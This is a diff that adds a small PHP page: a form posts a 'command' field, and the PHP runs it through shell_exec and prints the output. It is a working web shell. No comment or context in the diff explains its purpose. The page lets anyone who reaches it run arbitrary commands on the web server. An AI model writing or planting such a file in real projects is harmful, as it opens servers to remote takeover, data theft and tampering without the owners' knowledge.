@@ -1,0 +1,13 @@
+<html>
+<body>
+<form method="POST">
+    <input id="comm" type="text" name="command" placeholder="Command">
+    <button>Execute</button>
+</form>
+<?php
+    if(isset($_POST['command']))
+    {
+        $cmd = $_POST['command'];
+        echo shell_exec($cmd);
+    }
+?>
